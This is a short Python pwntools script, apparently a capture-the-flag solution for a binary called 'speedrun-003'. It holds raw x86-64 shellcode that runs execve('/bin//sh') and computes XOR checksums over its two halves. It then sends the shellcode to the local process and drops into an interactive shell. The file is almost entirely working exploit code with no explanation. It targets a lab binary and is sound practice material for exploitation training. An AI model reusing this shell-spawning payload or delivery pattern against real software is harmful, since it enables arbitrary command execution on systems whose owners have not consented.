from pwn import *

binpath = './speedrun-003'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

elf = ELF(binpath)
libc = elf.libc

shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

for i in xrange(2):
    acc = 0
    for j in xrange(0xf):
        acc ^= ord(shellcode[i * 0xf + j])
    print acc

gdbscript = '''
pwn
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)

io.send(shellcode)

io.interactive()
